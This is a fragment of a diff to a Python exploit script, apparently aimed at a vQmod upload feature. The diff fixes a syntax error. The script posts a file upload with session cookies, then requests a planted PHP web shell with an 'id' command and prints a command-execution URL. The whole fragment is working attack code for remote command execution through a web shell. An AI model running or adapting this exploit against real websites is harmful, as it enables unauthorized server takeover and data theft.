@@ -79,7 +79,7 @@ files = {
 
 
 response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
-r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id"
+r = requests.get(url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=id")
 
 if r.status_code == 200:
     print url + "../vqmod/xml/" + rand + ".php?c=id"
